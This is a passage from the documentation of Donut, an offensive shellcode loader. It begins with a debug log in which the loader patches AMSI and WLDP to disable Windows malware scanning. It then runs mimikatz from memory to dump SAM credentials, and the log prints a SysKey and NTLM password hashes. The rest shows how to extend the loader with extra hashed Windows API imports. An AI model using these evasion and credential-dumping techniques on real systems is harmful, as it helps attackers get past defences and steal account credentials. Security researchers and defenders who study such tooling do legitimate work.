DEBUG: bypass.c:122:DisableAMSI(): Overwriting AmsiScanBuffer
DEBUG: bypass.c:137:DisableAMSI(): Length of AmsiScanStringStub is 36 bytes.
DEBUG: bypass.c:147:DisableAMSI(): Overwriting AmsiScanString
DEBUG: loader.c:226:MainProc(): DisableAMSI OK
DEBUG: bypass.c:326:DisableWLDP(): Length of WldpQueryDynamicCodeTrustStub is 20 bytes.
DEBUG: bypass.c:350:DisableWLDP(): Length of WldpIsClassInApprovedListStub is 36 bytes.
DEBUG: loader.c:232:MainProc(): DisableWLDP OK
DEBUG: loader.c:239:MainProc(): Compression engine is 5
DEBUG: loader.c:242:MainProc(): Allocating 1015240 bytes of memory for decompressed file and module information
DEBUG: loader.c:252:MainProc(): Duplicating DONUT_MODULE
DEBUG: loader.c:256:MainProc(): Decompressing 478726 -> 1013912
DEBUG: loader.c:270:MainProc(): WorkSpace size : 1415999 | Fragment size : 5161
DEBUG: loader.c:277:MainProc(): Decompressing with RtlDecompressBufferEx(XPRESS HUFFMAN)
DEBUG: loader.c:302:MainProc(): Checking type of module
DEBUG: inmem_pe.c:101:RunPE(): Allocating 1019904 (0xf9000) bytes of RWX memory for file
DEBUG: inmem_pe.c:110:RunPE(): Copying Headers
DEBUG: inmem_pe.c:113:RunPE(): Copying each section to RWX memory 0000018F04B90000
DEBUG: inmem_pe.c:125:RunPE(): Applying Relocations
DEBUG: inmem_pe.c:149:RunPE(): Processing the Import Table
DEBUG: inmem_pe.c:157:RunPE(): Loading ADVAPI32.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading Cabinet.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading CRYPT32.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading cryptdll.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading DNSAPI.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading FLTLIB.DLL
DEBUG: inmem_pe.c:157:RunPE(): Loading NETAPI32.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading ole32.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading OLEAUT32.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading RPCRT4.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading SHLWAPI.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading SAMLIB.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading Secur32.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading SHELL32.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading USER32.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading USERENV.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading VERSION.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading HID.DLL
DEBUG: inmem_pe.c:157:RunPE(): Loading SETUPAPI.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading WinSCard.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading WINSTA.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading WLDAP32.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading advapi32.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading msasn1.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading ntdll.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading netapi32.dll
DEBUG: inmem_pe.c:157:RunPE(): Loading KERNEL32.dll
DEBUG: inmem_pe.c:180:RunPE(): Replacing KERNEL32.dll!ExitProcess with ntdll!RtlExitUserThread
DEBUG: inmem_pe.c:157:RunPE(): Loading msvcrt.dll
DEBUG: inmem_pe.c:180:RunPE(): Replacing msvcrt.dll!exit with ntdll!RtlExitUserThread
DEBUG: inmem_pe.c:180:RunPE(): Replacing msvcrt.dll!_cexit with ntdll!RtlExitUserThread
DEBUG: inmem_pe.c:180:RunPE(): Replacing msvcrt.dll!_exit with ntdll!RtlExitUserThread
DEBUG: inmem_pe.c:194:RunPE(): Processing Delayed Import Table
DEBUG: inmem_pe.c:202:RunPE(): Loading bcrypt.dll
DEBUG: inmem_pe.c:202:RunPE(): Loading ncrypt.dll
DEBUG: inmem_pe.c:317:RunPE(): Setting command line: CC6C lsadump::sam exit
DEBUG: inmem_pe.c:436:SetCommandLineW(): Obtaining handle for kernelbase
DEBUG: inmem_pe.c:452:SetCommandLineW(): Searching 2161 pointers
DEBUG: inmem_pe.c:461:SetCommandLineW(): BaseUnicodeCommandLine at 00007FFF74179E60 : loader  ..\instance
DEBUG: inmem_pe.c:469:SetCommandLineW(): New BaseUnicodeCommandLine at 00007FFF74179E60 : CC6C lsadump::sam exit
DEBUG: inmem_pe.c:486:SetCommandLineW(): New BaseAnsiCommandLine at 00007FFF74179E70 : CC6C lsadump::sam exit
DEBUG: inmem_pe.c:533:SetCommandLineW(): Setting ucrtbase.dll!__p__acmdln "loader  ..\instance" to "CC6C lsadump::sam exit"
DEBUG: inmem_pe.c:546:SetCommandLineW(): Setting ucrtbase.dll!__p__wcmdln "loader  ..\instance" to "CC6C lsadump::sam exit"
DEBUG: inmem_pe.c:533:SetCommandLineW(): Setting msvcrt.dll!_acmdln "loader  ..\instance" to "CC6C lsadump::sam exit"
DEBUG: inmem_pe.c:546:SetCommandLineW(): Setting msvcrt.dll!_wcmdln "loader  ..\instance" to "CC6C lsadump::sam exit"
DEBUG: inmem_pe.c:321:RunPE(): Wiping Headers from memory
DEBUG: inmem_pe.c:330:RunPE(): Creating thread for entrypoint of EXE : 0000018F04C207F8


  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # lsadump::sam
Domain : DESKTOP-B888L2R
SysKey : b43927eef0f56833c527ea951c37abc1
Local SID : S-1-5-21-1047138248-288568923-692962947

SAMKey : f1813d42812fcde9c5fe08807370613d

RID  : 000001f4 (500)
User : Administrator

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: c288f1c30b232571b0222ae6a5b7d223

RID  : 000003e9 (1001)
User : john
  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

RID  : 000003ea (1002)
User : user
  Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c

RID  : 000003eb (1003)
User : test

mimikatz(commandline) # exit
Bye!

DEBUG: inmem_pe.c:336:RunPE(): Process terminated
DEBUG: inmem_pe.c:347:RunPE(): Erasing 1019904 bytes of memory at 0000018F04B90000
DEBUG: inmem_pe.c:351:RunPE(): Releasing memory
DEBUG: loader.c:343:MainProc(): Erasing RW memory for instance
DEBUG: loader.c:346:MainProc(): Releasing RW memory for instance
DEBUG: loader.c:354:MainProc(): Returning to caller
</pre>

<p>Obviously you should be cautious with what files you decide to execute on your machine.</p>

<h2 id="loader">Extending The Loader</h2>

<p>Donut was never designed with modularity in mind, however, a new version in future will try to simplify the process of extending the loader, so that others can write their own code for it. Currently, simple changes to the loader can sometimes require lots of changes to the entire code base and this isn't really ideal. If for any reason you want to update the loader to include additional functionality, the following steps are required.</p>

<h3>1. Declare the function pointers</h3>

<p>For each API you want the loader to use, declare a function pointer in loader/winapi.h. For example, the <code>Sleep</code> API is declared in its SDK header file as:</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#400000; '>Sleep</span><span style='color:#808030; '>(</span><span style='color:#603000; '>DWORD</span> dwMilliseconds<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
</pre>

<p>The function pointer for this would be declared in loader/winapi.h as:</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#800000; font-weight:bold; '>typedef</span> <span style='color:#800000; font-weight:bold; '>void</span> <span style='color:#808030; '>(</span><span style='color:#603000; '>WINAPI</span> <span style='color:#808030; '>*</span>Sleep_t<span style='color:#808030; '>)</span><span style='color:#808030; '>(</span><span style='color:#603000; '>DWORD</span> dwMilliseconds<span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
</pre>

<h3>2. Update the API string array and function pointer array</h3>

<p>At the moment, Donut resolves API using a 64-bit hash, which is calculated by the generator before being stored in the shellcode itself. In donut.c is a variable called <var>api_imports</var>, declared as an array of <code>API_IMPORT</code> structures.  Each entry contains a case-sensitive API string and corresponding DLL string in lowercase. The <code>Sleep</code> API is exported by kernel32.dll, so if we want the loader to use Sleep, the <code>api_imports</code> must have the following added to it. This array is terminated by an empty entry.</p>

<pre style='color:#000000;background:#ffffff;'>  <span style='color:#800080; '>{</span>KERNEL32_DLL<span style='color:#808030; '>,</span> <span style='color:#800000; '>"</span><span style='color:#0000e6; '>Sleep</span><span style='color:#800000; '>"</span><span style='color:#800080; '>}</span><span style='color:#808030; '>,</span>
</pre>

<p>Of course, KERNEL32_DLL used here is a symbolic constant for "kernel32.dll".</p>

<p>The <code>DONUT_INSTANCE</code> structure is defined in include/donut.h and one of the fields called <code>api</code> is defined as a union to hold three members. <var>hash</var> is an array of <code>uint64_t</code> integers to hold a 64-bit hash of each API string. <var>addr</var> is an array of <code>void*</code> pointers to hold the address of an API in memory and finally a structure holding all the function pointers. These pointers are placed in the same order as the API strings stored in <var>api_imports</var>. Currently, the <var>api</var> member can hold up to 64 function pointers or hashes, but this can be increased if required.</p> 

<p>Where you place the API string in <var>api_imports</var> is entirely up to you, but it <em>must</em> be in the same order as where the function pointer is placed in the <code>DONUT_INSTANCE</code> structure.</p>

<h3>3. Update DLL names</h3>

<p>A number of DLL are already loaded by a process; ntdll.dll, kernel32.dll and kernelbase.dll. For everything else, the instance contains a list of DLL strings loaded before attempting to resolve the address of APIs. The following list of DLLs seperated by semi-colon are loaded prior to resolving API. If the API you want Donut loader to use is exported by a DLL not shown here, you need to add it to the list.</p>

<pre style='color:#000000;background:#ffffff;'><span style='color:#696969; '>// required for each API used by the loader</span>
<span style='color:#004a43; '>#</span><span style='color:#004a43; '>define</span><span style='color:#004a43; '> DLL_NAMES </span><span style='color:#800000; '>"</span><span style='color:#0000e6; '>ole32;oleaut32;wininet;mscoree;shell32;dnsapi</span><span style='color:#800000; '>"</span>
</pre>

<h3>4. Calling an API</h3>

<p>If the API were successfully resolved, simply referencing the function pointer in a pointer to <code>DONUT_INSTANCE</code> is enough to invoke it. The following line of code shows how to call the <code>Sleep</code> API declared earlier.</p>

<pre style='color:#000000;background:#ffffff;'>inst<span style='color:#808030; '>-</span><span style='color:#808030; '>></span>api<span style='color:#808030; '>.</span><span style='color:#400000; '>Sleep</span><span style='color:#808030; '>(</span><span style='color:#008c00; '>1000</span><span style='color:#808030; '>*</span><span style='color:#008c00; '>5</span><span style='color:#808030; '>)</span><span style='color:#800080; '>;</span>
</pre>

<p>Future plans for Donut are to provide multiple options for resolving API; Import Address Table (IAT), Export Address Table (EAT) and <a href="https://modexp.wordpress.com/2019/05/19/shellcode-getprocaddress/">Exception Directory</a> to name a few. It should also be much easier to write custom payloads using the loader.</p>

</body>
</html>